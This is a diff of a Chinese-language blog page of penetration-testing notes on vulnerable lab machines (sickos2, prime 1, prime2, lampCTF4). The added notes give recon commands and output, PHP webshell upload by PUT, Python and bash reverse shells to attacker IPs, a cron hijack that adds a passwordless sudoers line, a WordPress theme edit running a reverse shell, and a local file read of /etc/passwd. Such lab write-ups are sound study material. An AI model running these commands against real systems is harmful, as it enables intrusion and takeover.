@@ -48,8 +48,17 @@
 <meta property="og:image" content="https://api2.mubu.com/v3/document_image/b0650d15-a14f-410d-8e88-5e444e4ffcbf-18494357.jpg">
 <meta property="og:image" content="https://api2.mubu.com/v3/document_image/cf0e5e49-a74e-4ab7-b332-523dd9eebafb-18494357.jpg">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/38f69a88-a519-432d-a4be-458890219659-18494357.jpg">
+<meta property="og:image" content="https://api2.mubu.com/v3/document_image/70a922dc-e820-4b23-aa5d-a8afe464b7fc-18494357.jpg">
+<meta property="og:image" content="https://api2.mubu.com/v3/document_image/d7f49224-c148-450b-8460-74cf27d38a0e-18494357.jpg">
+<meta property="og:image" content="https://api2.mubu.com/v3/document_image/36c1ba1c-191f-4957-be77-ac546591cb3e-18494357.jpg">
+<meta property="og:image" content="https://api2.mubu.com/v3/document_image/5c80ac6e-ef16-4183-8724-bdbfe4eb023c-18494357.jpg">
+<meta property="og:image" content="https://api2.mubu.com/v3/document_image/2ae0ad8b-8f04-4551-a6bb-e9a3a8af50ff-18494357.jpg">
+<meta property="og:image" content="https://api2.mubu.com/v3/document_image/528c58e1-5263-4eb4-ae71-af44a8627176-18494357.jpg">
+<meta property="og:image" content="https://api2.mubu.com/v3/document_image/399f870a-9404-4e31-bb1b-e95c40014fc7-18494357.jpg">
+<meta property="og:image" content="https://api2.mubu.com/v3/document_image/3018fe38-5ae7-4baf-84c8-b2f9f9e8c785-18494357.jpg">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230417194051405.png">
 <meta property="article:published_time" content="2023-03-16T01:15:57.000Z">
-<meta property="article:modified_time" content="2023-04-11T12:39:00.249Z">
+<meta property="article:modified_time" content="2023-04-17T11:41:14.087Z">
 <meta property="article:author" content="ZER0">
 <meta property="article:tag" content="vulhub靶机 渗透">
 <meta name="twitter:card" content="summary">
@@ -214,7 +223,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-04-11 20:39:00" itemprop="dateModified" datetime="2023-04-11T20:39:00+08:00">2023-04-11</time>
+                <time title="修改时间：2023-04-17 19:41:14" itemprop="dateModified" datetime="2023-04-17T19:41:14+08:00">2023-04-17</time>
               </span>
 
           
@@ -229,7 +238,8 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h2 id="W1R3S"><a href="#W1R3S" class="headerlink" title="W1R3S"></a>W1R3S</h2><p>获得靶机IP（记得kali、靶机网络都改桥接）得到ip 192.168.1.28</p>
+        <p>[TOC]</p>
+<h2 id="W1R3S"><a href="#W1R3S" class="headerlink" title="W1R3S"></a>W1R3S</h2><p>获得靶机IP（记得kali、靶机网络都改桥接）得到ip 192.168.1.28</p>
 <h3 id="nmap-扫服务"><a href="#nmap-扫服务" class="headerlink" title="nmap 扫服务"></a>nmap 扫服务</h3><p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230316092242512.png" alt="image-20230316092242512"></p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap --min-rate 10000  -p-  192.168.1.28      （全面的扫描端口）</span><br><span class="line">sudo nmap -sT -sV -O -p21,22,80,3306 192.168.1.28 （扫描对应端口获取详细信息）（TCP扫描）</span><br><span class="line">    PORT     STATE SERVICE VERSION</span><br><span class="line">    21/tcp   open  ftp     vsftpd 2.0.8 or later</span><br><span class="line">    22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">    80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">    3306/tcp open  mysql   MySQL (unauthorized)</span><br><span class="line">    10123/tcp open  unknown</span><br><span class="line">    MAC Address: 00:0C:29:A0:15:2E (VMware)</span><br><span class="line">    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">    Device type: general purpose</span><br><span class="line">    Running: Linux 3.X|4.X|5.X</span><br><span class="line">    OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5.1</span><br><span class="line">    OS details: Linux 3.10 - 4.11, Linux 3.2 - 4.9, Linux 5.1</span><br><span class="line">    Network Distance: 1 hop</span><br><span class="line">    Service Info: Host: W1R3S.inc; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line">    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">    Nmap done: 1 IP address (1 host up) scanned in 13.06 seconds</span><br><span class="line">sudo nmap -sU -p21,22,80,3306 192.168.1.28 （udp扫描）//记住还可以扫IPV6</span><br><span class="line">sudo nmap --script=vuln -p21,22,80,3306 192.168.1.28  //（扫描插件漏洞） </span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
@@ -305,6 +315,534 @@
 </ul>
 </li>
 </ul>
+<h2 id="sickos2"><a href="#sickos2" class="headerlink" title="sickos2"></a>sickos2</h2><ul>
+<li><p>目标探测</p>
+<ul>
+<li><p>──(kali㉿kali)-[~&#x2F;Desktop]</p>
+</li>
+<li><p>└─$ sudo nmap  -sV -sT -O  -p22,80 192.168.0.105</p>
+</li>
+<li><p>Starting Nmap 7.93 ( <a target="_blank" rel="noopener" href="https://nmap.org/">https://nmap.org</a> ) at 2023-02-06 22:49 EST</p>
+</li>
+<li><p>Nmap scan report for 192.168.0.105</p>
+</li>
+<li><p>Host is up (0.00025s latency).</p>
+</li>
+<li><p>PORT   STATE SERVICE VERSION</p>
+</li>
+<li><p>22&#x2F;tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.8 (Ubuntu Linux; protocol 2.0)</p>
+</li>
+<li><p>80&#x2F;tcp open  http    lighttpd 1.4.28</p>
+</li>
+<li><p>MAC Address: 00:0C:29:9D:7F:28 (VMware)</p>
+</li>
+<li><p>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</p>
+</li>
+<li><p>Device type: general purpose</p>
+</li>
+<li><p>Running: Linux 3.X|4.X</p>
+</li>
+<li><p>OS CPE: cpe:&#x2F;o:linux:linux_kernel:3 cpe:&#x2F;o:linux:linux_kernel:4</p>
+</li>
+<li><p>OS details: Linux 3.10 - 4.11, Linux 3.16 - 4.6, Linux 3.2 - 4.9, Linux 4.4</p>
+</li>
+<li><p>Network Distance: 1 hop</p>
+</li>
+<li><p>Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</p>
+</li>
+<li><p>OS and Service detection performed. Please report any incorrect results at <a target="_blank" rel="noopener" href="https://nmap.org/submit/">https://nmap.org/submit/</a> .</p>
+</li>
+</ul>
+</li>
+<li><p>nikto</p>
+<ul>
+<li><p>┌──(kali㉿kali)-[~&#x2F;Desktop]</p>
+</li>
+<li><p>└─$ nikto -url 192.168.0.105                                                                                                                                                                                                                                                    1 ⨯</p>
+</li>
+<li><p>- Nikto v2.1.6</p>
+</li>
+<li><p>-————————————————————————–</p>
+</li>
+<li><p>+ Target IP:          192.168.0.105</p>
+</li>
+<li><p>+ Target Hostname:    192.168.0.105</p>
+</li>
+<li><p>+ Target Port:        80</p>
+</li>
+<li><p>+ Start Time:         2023-02-07 01:51:25 (GMT-5)</p>
+</li>
+<li><p>-————————————————————————–</p>
+</li>
+<li><p>+ Server: lighttpd&#x2F;1.4.28</p>
+</li>
+<li><p>+ The anti-clickjacking X-Frame-Options header is not present.</p>
+</li>
+<li><p>+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</p>
+</li>
+<li><p>+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type</p>
+</li>
+<li><p>+ All CGI directories ‘found’, use ‘-C none’ to test none</p>
+</li>
+<li><p>+ Retrieved x-powered-by header: PHP&#x2F;5.3.10-1ubuntu3.21</p>
+</li>
+<li><p>+ 26545 requests: 0 error(s) and 4 item(s) reported on remote host</p>
+</li>
+<li><p>+ End Time:           2023-02-07 01:52:28 (GMT-5) (63 seconds)</p>
+</li>
+<li><p>-————————————————————————–</p>
+</li>
+<li><p>+ 1 host(s) tested</p>
+</li>
+</ul>
+</li>
+<li><p>dirb 扫描到  <a target="_blank" rel="noopener" href="http://192.168.0.105/test/">http://192.168.0.105/test/</a> </p>
+</li>
+<li><p>whatweb</p>
+<ul>
+<li><p>┌──(kali㉿kali)-[~&#x2F;Desktop]</p>
+</li>
+<li><p>└─$ whatweb 192.168.0.105                                                                                                                                                                                                                                                     130 ⨯</p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="http://192.168.0.105/">http://192.168.0.105</a> [200 OK] Country[RESERVED][ZZ], HTTPServer[lighttpd&#x2F;1.4.28], IP[192.168.0.105], PHP[5.3.10-1ubuntu3.21], X-Powered-By[PHP&#x2F;5.3.10-1ubuntu3.21], lighttpd[1.4.28]</p>
+</li>
+</ul>
+</li>
+<li><p>nmap –script-help http-methods     </p>
+</li>
+<li><p>nmap –script http-methods –script-args http-methods.url-path&#x3D;’&#x2F;test’ 192.168.0.105</p>
+</li>
+<li><p>向对应目录PUT发现确实可以写文件</p>
+<ul>
+<li>例子<img src="https://api2.mubu.com/v3/document_image/70a922dc-e820-4b23-aa5d-a8afe464b7fc-18494357.jpg" alt="img"></li>
+</ul>
+</li>
+<li><p>反弹shell</p>
+<ul>
+<li><p>php一句话，然后使用蚁剑连接<img src="https://api2.mubu.com/v3/document_image/d7f49224-c148-450b-8460-74cf27d38a0e-18494357.jpg" alt="img"></p>
+</li>
+<li><p>使用hackbar 得python reverse_shell 反弹</p>
+<ul>
+<li><p>python -c ‘import os,pty,socket;s&#x3D;socket.socket();s.connect((“192.168.0.107”,443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(“sh”)’</p>
+</li>
+<li><p>切换到交互式python  python -c ‘import pty; pty.spawn(“&#x2F;bin&#x2F;bash”)’<img src="https://api2.mubu.com/v3/document_image/36c1ba1c-191f-4957-be77-ac546591cb3e-18494357.jpg" alt="img"></p>
+</li>
+<li><p>另外：</p>
+<ul>
+<li><p>curl上传文件</p>
+<ul>
+<li><p>curl -v -T php-reverse-shell.php “<a target="_blank" rel="noopener" href="http://192.168.30.208/test/">http://192.168.30.208/test/</a>“</p>
+</li>
+<li><h2 id="v-–verbose-输出详细内容"><a href="#v-–verbose-输出详细内容" class="headerlink" title="#-v, –verbose                  输出详细内容"></a>#-v, –verbose                  输出详细内容</h2><p>  -<br>- #-T, –upload-file FILE			后跟上传目标文件（Transfer）</p>
+</li>
+<li><p>#-H, –header      LINE         添加请求头, 可添加多个 -H 参数</p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>提权</p>
+<ul>
+<li><p>whoami;pwd;uname -a</p>
+</li>
+<li><p>lsb_release -a</p>
+<ul>
+<li><p>www-data@ubuntu:&#x2F;tmp$ lsb_release -a</p>
+</li>
+<li><p>lsb_release -a</p>
+</li>
+<li><p>No LSB modules are available.</p>
+</li>
+<li><p>Distributor ID: Ubuntu</p>
+</li>
+<li><p>Description:    Ubuntu 12.04.4 LTS</p>
+</li>
+<li><p>Release:        12.04</p>
+</li>
+<li><p>Codename:       precise</p>
+</li>
+</ul>
+</li>
+<li><p>seachexploit 没找到</p>
+</li>
+<li><p>看定时任务</p>
+</li>
+<li><p>ls -la &#x2F;etc&#x2F;cron*</p>
+</li>
+<li><p>printf ‘#!&#x2F;bin&#x2F;bash\nbash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.137.150&#x2F;8080 0&gt;&amp;1\n’ &gt; &#x2F;tmp&#x2F;update</p>
+</li>
+<li><p>echo ‘chmod +w &#x2F;etc&#x2F;sudoers &amp;&amp; echo “www-data ALL&#x3D;(ALL)  NOPASSWD:ALL” &gt; &#x2F;etc&#x2F;sudoers’ &gt; &#x2F;tmp&#x2F;update<img src="https://api2.mubu.com/v3/document_image/5c80ac6e-ef16-4183-8724-bdbfe4eb023c-18494357.jpg" alt="img"></p>
+</li>
+<li><p>sudo &#x2F;bin&#x2F;bash</p>
+</li>
+<li><p>get</p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="prime-1"><a href="#prime-1" class="headerlink" title="prime 1"></a>prime 1</h2><ul>
+<li><p>自己慢慢测试</p>
+<ul>
+<li><p>得到靶机IP 192.168.0.109</p>
+</li>
+<li><p>nmap 扫描（TCP、UDP、–min-rate、–script）得到22、80开的</p>
+</li>
+<li><p>nikto访问web目录没找到明显漏洞</p>
+</li>
+<li><p>dirb 扫描一下web</p>
+<ul>
+<li><p>访问<a target="_blank" rel="noopener" href="http://192.168.0.109/dev%EF%BC%8C%E6%B2%A1%E5%95%A5%E6%9C%89%E7%94%A8%E4%B8%9C%E8%A5%BF">http://192.168.0.109/dev，没啥有用东西</a></p>
+</li>
+<li><p>dirb <a target="_blank" rel="noopener" href="http://192.168.0.109/">http://192.168.0.109</a> -X .txt,.php,.html    找到secret.txt</p>
+<ul>
+<li><p>Looks like you have got some secrets.</p>
+</li>
+<li><p>Ok I just want to do some help to you. </p>
+</li>
+<li><p>Do some more fuzz on every page of php which was finded by you. And if</p>
+</li>
+<li><p>you get any right parameter then follow the below steps. If you still stuck </p>
+</li>
+<li><p>Learn from here a basic tool with good usage for OSCP.</p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://github.com/hacknpentest/Fuzzing/blob/master/Fuzz_For_Web">https://github.com/hacknpentest/Fuzzing/blob/master/Fuzz_For_Web</a></p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>wfuzz -w &#x2F;usr&#x2F;share&#x2F;wfuzz&#x2F;wordlist&#x2F;general&#x2F;common.txt   <a target="_blank" rel="noopener" href="http://192.168.0.109/index.php?FUZZ">http://192.168.0.109/index.php?FUZZ</a></p>
+</li>
+<li><p>wfuzz -c -w &#x2F;usr&#x2F;share&#x2F;wfuzz&#x2F;wordlist&#x2F;general&#x2F;common.txt  –hc 404 –hw 12  <a target="_blank" rel="noopener" href="http://192.168.0.109/index.php?FUZZ">http://192.168.0.109/index.php?FUZZ</a></p>
+</li>
+<li><p>然后得到进一步信息<img src="https://api2.mubu.com/v3/document_image/2ae0ad8b-8f04-4551-a6bb-e9a3a8af50ff-18494357.jpg" alt="img"></p>
+</li>
+<li><p>发现可以文件读取：<a target="_blank" rel="noopener" href="http://192.168.0.109/image.php?file=location.txt&secrettier360=/etc/passwd">http://192.168.0.109/image.php?file=location.txt&amp;secrettier360=/etc/passwd</a> ，saket:x:1001:1001:find password.txt file in my directory:&#x2F;home&#x2F;saket:</p>
+</li>
+<li><p>访问 &#x2F;home&#x2F;saket&#x2F;password.txt,得到victor密码，进入wordpress管理界面</p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="http://192.168.0.109/wordpress/wp-admin/index.php">http://192.168.0.109/wordpress/wp-admin/index.php</a></p>
+</li>
+<li><p>编辑一个界面：<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.229.128/1234 0>&1'"); ?></p>
+</li>
+<li><p>访问<img src="https://api2.mubu.com/v3/document_image/528c58e1-5263-4eb4-ae71-af44a8627176-18494357.jpg" alt="img"></p>
+</li>
+<li><p>whoami，uname -a，lsb-release，cat &#x2F;etc&#x2F;cron*</p>
+</li>
+<li><p>内核提权：searchsploit ubuntu 4.10 | grep “Pri” </p>
+</li>
+<li><p>找个c文件编译</p>
+</li>
+<li><p>python -c ‘import pty; pty.spawn(“&#x2F;bin&#x2F;bash”)’</p>
+</li>
+<li><p>上传文件</p>
+<ul>
+<li><p>nc上传</p>
+<ul>
+<li><p>www-data：nc -lp 4444 &gt; 45010.c</p>
+</li>
+<li><p>发送端：nc 192.168.0.109 4444  &lt; 45010.c</p>
+</li>
+<li><p>成功<img src="https://api2.mubu.com/v3/document_image/399f870a-9404-4e31-bb1b-e95c40014fc7-18494357.jpg" alt="img"></p>
+</li>
+</ul>
+</li>
+<li><p>开php服务上传</p>
+<ul>
+<li><p>php  -S  host:port  -t &#x2F;www,php -S 0:1234 -t  phpserver  </p>
+</li>
+<li><p>wget <a target="_blank" rel="noopener" href="http://192.168.0.107:1234/45010.c">http://192.168.0.107:1234/45010.c</a></p>
+</li>
+<li><p>ok</p>
+</li>
+<li></li>
+</ul>
+</li>
+<li><p>metasploit 直接upload</p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="prime2"><a href="#prime2" class="headerlink" title="prime2"></a>prime2</h2><ul>
+<li><p>主机探测信息收集</p>
+<ul>
+<li><p>ip a，namp -sn 192.168.1.0&#x2F;24，nmap –min-rate 10000 192.168.1.40  ,sudo nmap -sT  -sV -O  192.168.1.40 ,sudo nmap -sU -sV -O  192.168.1.40 </p>
+<ul>
+<li><p>PORT    STATE SERVICE     VERSION</p>
+</li>
+<li><p>22&#x2F;tcp  open  ssh         OpenSSH 8.4p1 Ubuntu 5ubuntu1 (Ubuntu Linux; protocol 2.0)</p>
+</li>
+<li><p>80&#x2F;tcp  open  http        Apache httpd 2.4.46 ((Ubuntu))</p>
+</li>
+<li><p>139&#x2F;tcp open  netbios-ssn Samba smbd 4.6.2</p>
+</li>
+<li><p>445&#x2F;tcp open  netbios-ssn Samba smbd 4.6.2</p>
+</li>
+<li><p>10123</p>
+</li>
+<li><p>MAC Address: 00:0C:29:25:DB:31 (VMware)</p>
+</li>
+<li><p>Device type: general purpose</p>
+</li>
+<li><p>Running: Linux 4.X|5.X</p>
+</li>
+<li><p>OS CPE: cpe:&#x2F;o:linux:linux_kernel:4 cpe:&#x2F;o:linux:linux_kernel:5</p>
+</li>
+<li><p>OS details: Linux 4.15 - 5.6</p>
+</li>
+<li><p>Network Distance: 1 hop</p>
+</li>
+<li><p>Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</p>
+</li>
+</ul>
+</li>
+<li><p>nmap –script&#x3D;vuln -p 22,80,139,445 192.168.1.40  </p>
+<ul>
+<li><p>┌──(kali㉿kali)-[~&#x2F;Desktop]</p>
+</li>
+<li><p>└─$ nmap –script&#x3D;vuln -p 22,80,139,445 192.168.1.40                                                                                                                                                                                                                                      130 ⨯</p>
+</li>
+<li><p>Starting Nmap 7.93 ( <a target="_blank" rel="noopener" href="https://nmap.org/">https://nmap.org</a> ) at 2023-02-07 20:56 EST</p>
+</li>
+<li><p>Stats: 0:00:31 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan</p>
+</li>
+<li><p>NSE Timing: About 50.00% done; ETC: 20:58 (0:00:32 remaining)</p>
+</li>
+<li><p>Pre-scan script results:</p>
+</li>
+<li><p>| broadcast-avahi-dos: </p>
+</li>
+<li><p>|   Discovered hosts:</p>
+</li>
+<li><p>|     224.0.0.251</p>
+</li>
+<li><p>|   After NULL UDP avahi packet DoS (CVE-2011-1002).</p>
+</li>
+<li><p>|_  Hosts are all up (not vulnerable).</p>
+</li>
+<li><p>Nmap scan report for 192.168.1.40</p>
+</li>
+<li><p>Host is up (0.00035s latency).</p>
+</li>
+<li><p>PORT    STATE SERVICE</p>
+</li>
+<li><p>22&#x2F;tcp  open  ssh</p>
+</li>
+<li><p>80&#x2F;tcp  open  http</p>
+</li>
+<li><p>| http-enum: </p>
+</li>
+<li><p>|   &#x2F;css&#x2F;: Potentially interesting directory w&#x2F; listing on ‘apache&#x2F;2.4.46 (ubuntu)’</p>
+</li>
+<li><p>|   &#x2F;images&#x2F;: Potentially interesting directory w&#x2F; listing on ‘apache&#x2F;2.4.46 (ubuntu)’</p>
+</li>
+<li><p>|_  &#x2F;server&#x2F;: Potentially interesting directory w&#x2F; listing on ‘apache&#x2F;2.4.46 (ubuntu)’</p>
+</li>
+<li><p>|_http-csrf: Couldn’t find any CSRF vulnerabilities.</p>
+</li>
+<li><p>|_http-stored-xss: Couldn’t find any stored XSS vulnerabilities.</p>
+</li>
+<li><p>|_http-dombased-xss: Couldn’t find any DOM based XSS.</p>
+</li>
+<li><p>139&#x2F;tcp open  netbios-ssn</p>
+</li>
+<li><p>445&#x2F;tcp open  microsoft-ds</p>
+</li>
+<li><p>10123</p>
+</li>
+<li><p>Host script results:</p>
+</li>
+<li><p>|_smb-vuln-ms10-054: false</p>
+</li>
+<li><p>|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: ERROR: Server returned less data than it was supposed to (one or more fields are missing); aborting [9]</p>
+</li>
+<li><p>|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: ERROR: Server returned less data than it was supposed to (one or more fields are missing); aborting [9]</p>
+</li>
+<li><p>Nmap done: 1 IP address (1 host up) scanned in 66.34 seconds</p>
+</li>
+</ul>
+</li>
+<li><p>端口探测：</p>
+<ul>
+<li><p>80端口：</p>
+<ul>
+<li><p>nikto -url <a target="_blank" rel="noopener" href="http://192.168.1.40/">http://192.168.1.40</a></p>
+<ul>
+<li><p>- Nikto v2.1.6</p>
+</li>
+<li><p>-————————————————————————–</p>
+</li>
+<li><p>+ Target IP:          192.168.1.40</p>
+</li>
+<li><p>+ Target Hostname:    192.168.1.40</p>
+</li>
+<li><p>+ Target Port:        80</p>
+</li>
+<li><p>+ Start Time:         2023-02-07 21:01:32 (GMT-5)</p>
+</li>
+<li><p>-————————————————————————–</p>
+</li>
+<li><p>+ Server: Apache&#x2F;2.4.46 (Ubuntu)</p>
+</li>
+<li><p>+ The anti-clickjacking X-Frame-Options header is not present.</p>
+</li>
+<li><p>+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</p>
+</li>
+<li><p>+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type</p>
+</li>
+<li><p>+ No CGI Directories found (use ‘-C all’ to force check all possible dirs)</p>
+</li>
+<li><p>+ Server may leak inodes via ETags, header found with file &#x2F;, inode: 1681, size: 5c1cb40b7dd57, mtime: gzip</p>
+</li>
+<li><p>+ Allowed HTTP Methods: HEAD, GET, POST, OPTIONS </p>
+</li>
+<li><p>+ OSVDB-3268: &#x2F;server&#x2F;: Directory indexing found.</p>
+</li>
+<li><p>+ &#x2F;server&#x2F;: Possibly Macromedia JRun or CRX WebDAV upload</p>
+</li>
+<li><p>+ OSVDB-3268: &#x2F;css&#x2F;: Directory indexing found.</p>
+</li>
+<li><p>+ OSVDB-3092: &#x2F;css&#x2F;: This might be interesting…</p>
+</li>
+<li><p>+ OSVDB-3268: &#x2F;images&#x2F;: Directory indexing found.</p>
+</li>
+<li><p>+ 7916 requests: 0 error(s) and 10 item(s) reported on remote host</p>
+</li>
+<li><p>+ End Time:           2023-02-07 21:02:23 (GMT-5) (51 seconds)</p>
+</li>
+</ul>
+</li>
+<li><p>访问&#x2F;server，看到文件下载下来之后在分析<img src="https://api2.mubu.com/v3/document_image/3018fe38-5ae7-4baf-84c8-b2f9f9e8c785-18494357.jpg" alt="img"></p>
+</li>
+<li><p>wpscan –url 192.168.1.40&#x2F;wp -e    </p>
+<ul>
+<li>得到admin</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>10123：</p>
+<ul>
+<li><p>wget下载目录文件：wget -r -np -nH -R index.html <a target="_blank" rel="noopener" href="http://url/including/files/you/want/to/download/">http://url/including/files/you/want/to/download/</a></p>
+</li>
+<li><p>发现一个shell文件，盲猜之后要利用</p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="lampCTF4"><a href="#lampCTF4" class="headerlink" title="lampCTF4"></a>lampCTF4</h2><h3 id="自己："><a href="#自己：" class="headerlink" title="自己："></a>自己：</h3><p>得到目标IP</p>
+<p>访问web服务</p>
+<p>访问blog：<a target="_blank" rel="noopener" href="http://192.168.222.142/index.html?page=blog&title=Blog&id=2">http://192.168.222.142/index.html?page=blog&amp;title=Blog&amp;id=2</a></p>
+<p>看到id&#x3D;2，怀疑有sql注入，输入引号，还真有，sqlmap能一把梭</p>
+<p>得到用户名密码。</p>
+<p>ssh：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ ssh 192.168.222.142                                                              </span><br><span class="line">Unable to negotiate with 192.168.222.142 port 22: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1</span><br><span class="line"></span><br><span class="line">问下gpt，还挺厉害</span><br><span class="line">怎样解决：ssh 192.168.222.142                                                              </span><br><span class="line">Unable to negotiate with 192.168.222.142 port 22: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1</span><br><span class="line">这个问题是由于你的SSH客户端和远程服务器在密钥交换方法上不匹配。目前，远程服务器提供的密钥交换方法包括 diffie-hellman-group-exchange-sha1、diffie-hellman-group14-sha1 和 diffie-hellman-group1-sha1。这些方法可能已被视为不安全或已被弃用。</span><br><span class="line">为了解决这个问题，你可以尝试以下几种方法：</span><br><span class="line">更新你的SSH客户端到最新版本。这样，你的客户端可能会支持更安全的密钥交换方法。在Linux或macOS系统上，你可以通过运行以下命令来更新：</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get upgrade</span><br><span class="line">在macOS上，如果你使用Homebrew安装了OpenSSH，可以运行：</span><br><span class="line">brew update</span><br><span class="line">brew upgrade openssh</span><br><span class="line">如果你无法更新SSH客户端，或者更新后仍然出现问题，你可以尝试临时修改SSH客户端配置以接受远程服务器提供的密钥交换方法。在命令行中运行以下命令：</span><br><span class="line">ssh -oKexAlgorithms=+diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1 user@192.168.222.142</span><br><span class="line">这将允许SSH客户端在本次会话中使用这些方法。请注意，这可能会降低安全性。</span><br><span class="line">另一种解决方案是更新远程服务器的SSH服务器配置，以支持更安全的密钥交换方法。这需要在服务器上编辑/etc/ssh/sshd_config文件，并添加或修改以下行：</span><br><span class="line">KexAlgorithms curve25519-sha256@libssh.org,ecdh-sha2-nistp521,ecdh-sha2-nistp384,ecdh-sha2-nistp256,diffie-hellman-group-exchange-sha256</span><br><span class="line">保存文件后，重启SSH服务器：</span><br><span class="line">sudo systemctl restart ssh</span><br><span class="line">这样，远程服务器将支持更安全的密钥交换方法。请确保在尝试此方法之前，你有远程服务器的管理员权限。</span><br><span class="line"></span><br><span class="line">ssh -oKexAlgorithms=+diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1 dstevens@192.168.222.142</span><br><span class="line">Unable to negotiate with 192.168.222.142 port 22: no matching host key type found. Their offer: ssh-rsa,ssh-dss</span><br><span class="line">回答：</span><br><span class="line">这个问题是因为SSH客户端与远程服务器在主机密钥类型上不匹配。目前，远程服务器提供的主机密钥类型包括ssh-rsa和ssh-dss，这些类型可能已被视为不安全或已被弃用。</span><br><span class="line"></span><br><span class="line">要解决此问题，你可以尝试以下方法：</span><br><span class="line">临时修改SSH客户端配置以接受远程服务器提供的主机密钥类型。在命令行中运行以下命令：</span><br><span class="line">ssh -oHostKeyAlgorithms=+ssh-rsa,ssh-dss user@192.168.222.142</span><br><span class="line">这将允许SSH客户端在本次会话中使用这些主机密钥类型。请注意，这可能会降低安全性。</span><br><span class="line"></span><br><span class="line">更新远程服务器的SSH服务器配置以支持更安全的主机密钥类型。这需要在服务器上编辑/etc/ssh/sshd_config文件，并添加或修改以下行：</span><br><span class="line">HostKeyAlgorithms ssh-ed25519,ssh-rsa,ssh-dss</span><br><span class="line">同时，请确保在/etc/ssh/目录下生成对应的新主机密钥（如果尚未生成）：</span><br><span class="line"></span><br><span class="line">sudo ssh-keygen -t ed25519 -f /etc/ssh/ssh_host_ed25519_key -N &#x27;&#x27;</span><br><span class="line">保存文件后，重启SSH服务器：</span><br><span class="line"></span><br><span class="line">sudo systemctl restart ssh</span><br><span class="line">这样，远程服务器将支持更安全的主机密钥类型。请确保在尝试此方法之前，你有远程服务器的管理员权限。</span><br><span 